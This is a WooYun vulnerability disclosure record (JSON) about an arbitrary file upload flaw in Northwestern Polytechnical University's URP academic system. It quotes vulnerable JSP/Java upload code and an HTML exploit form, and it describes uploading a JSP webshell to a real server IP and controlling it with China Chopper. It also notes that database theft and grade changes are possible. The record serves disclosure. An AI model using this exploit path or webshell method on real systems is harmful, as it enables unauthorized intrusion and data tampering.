{"id": 40233, "wybug_id": "wooyun-2015-092108", "wybug_title": "西北工业大学教务处urp可以getshell", "wybug_corp": "西北工业大学", "wybug_author": "yibeizifd", "wybug_date": "2015-01-16 15:33", "wybug_open_date": "2015-01-21 15:34", "wybug_type": "网络设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(CCERT教育网应急响应组)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-21：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 学弟发现存在通杀urp漏洞，所以后续我来进行检测，发现果然getshell，影响很大，来一发 详细说明：  这个系统使用了Smartupload组件，先来看下lwUpLoad_action的部分源码。\n<script language=\"javaScript\" type=\"\">          //转向          function doAction(type){\t\t\tdocument.forms[0].action=\"uploadLwywAction.do?actionType=upload&returnStr=\"+type;\t\t\t//alert(document.forms[0].action);            document.forms[0].submit();          }</script></head><body><form  method=\"post\" action=\"/uploadLwywAction\" ><%\tSmartUpload  mySmartUpload = new SmartUpload();\tmySmartUpload.initialize(pageContext);    mySmartUpload.upload();     //int fileSize=mySmartUpload.getSize();    File file=mySmartUpload.getFiles().getFile(0);    Request req=mySmartUpload.getRequest();    //扩展名    String fileExt=file.getFileExt();    String realPath=request.getRealPath(\"/lwUpLoadTemp\");    String fileName=req.getParameter(\"xh\")+\".\"+fileExt;    String filePath=realPath+\"/\"+fileName;    if(!file.isMissing()){    \tfile.saveAs(\"/lwUpLoadTemp/\"+fileName,mySmartUpload.SAVE_VIRTUAL);    }  \tString returnStr=TestBean.uploadLwyw(filePath,req);  \t//根据返回值 判断操作  \tif(returnStr.equals(\"yes\")){%>  \t<input type=\"hidden\" name=\"zxjxjhh\" value=\"<%=req.getParameter(\"zxjxjhh\") %>\">  \t<input type=\"hidden\" name=\"tmbh\" value=\"<%=req.getParameter(\"tmbh\") %>\">  \t<input type=\"hidden\" name=\"xh\" value=\"<%=req.getParameter(\"xh\") %>\">  \t<script type=\"text/javascript\">doAction(\"yes\")</script>  \t<%  \t}else if(returnStr.equals(\"full\")){  \t %>\t<script type=\"text/javascript\">doAction(\"full\")</script>\t<%\t}else {\t %>\t <script type=\"text/javascript\">doAction(\"error\")</script>\t <%\t }\t  %>\n这个没有问题，主要看uploadlwyw.jsp的一部分代码这个部分，在这里也没有限制上传类型，当然还得看后端的处理\nString action = httpServletRequest.getParameter(\"actionType\");\t\tif (action.equals(\"upload\"))\t\t\treturn upload(actionMapping, actionForm, httpServletRequest, httpServletResponse);public ActionForward upload(ActionMapping actionMapping, ActionForm actionForm, HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse)\t{\t\tUploadLwywForm form;\t\tUploadLwywForm uploadLwywActionForm = (UploadLwywForm)actionForm;\t\tHttpSession session = httpServletRequest.getSession(false);\t\tUserInforVO userInfor = (UserInforVO)session.getAttribute(\"userInfor\");\t\tform = (UploadLwywForm)actionForm;\t\tif (isSuccess.equals(\"yes\"))\t\t{\t\t\tString zxjxjhh = form.getZxjxjhh();\t\t\tString tmbh = form.getTmbh();\t\t\tString xh = form.getXh();\t\t\tLwLwxxbId lwLwxxbId = new LwLwxxbId(new LwXtb(new LwXtbId(new LwTmxxb(new LwTmxxbId(zxjxjhh, tmbh)), xh)));\n后端没有处理啊，是个任意文件上传。写个表单就好了.\n<form action=\"http://x.x.x.x/lwUpLoad_action.jsp\" method=\"post\" enctype=\"multipart/form-data\" > <input type=\"file\" name=\"theFile\" id=\"File\"/> <input type=\"text\" name=\"xh\" id=\"context\"/> <input type=\"submit\" value=\"show me the shell\" > </form>\n，然后需要改的地方很明显了，就是自己urp的url   漏洞证明：  首先将表单后缀改成html打开\n\n，然后上传一个jsp小马，在show the shell处改变自己的小马地址用菜刀连接http://222.24.192.69/lwUpLoadTemp/123.jsp，拿到getshell\n\n后续可以脱裤，修改成绩什么的，由于我是一名白帽子，所以提交给乌云了，不敢违法的事，影响还是很大的。   修复方案：  修复的话在后端action做验证吧，做个上传类型验证限制，上一次提交说我没有url，我就只好再发一次了，至此给通过吧，我只想要一枚邀请码，肉肉姐，我一直默默关注你偶   版权声明：转载请注明来源 yibeizifd@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-01-21 15:34 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-13 16:53 |    \t\tHackPanda \t\t\t( 普通白帽子  |\t\t\t        Rank:113 漏洞数:15        | Talk is cheap,show me the shell.)\t\t \n  @yibeizifd 呵呵学长你好…复制粘贴你好    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}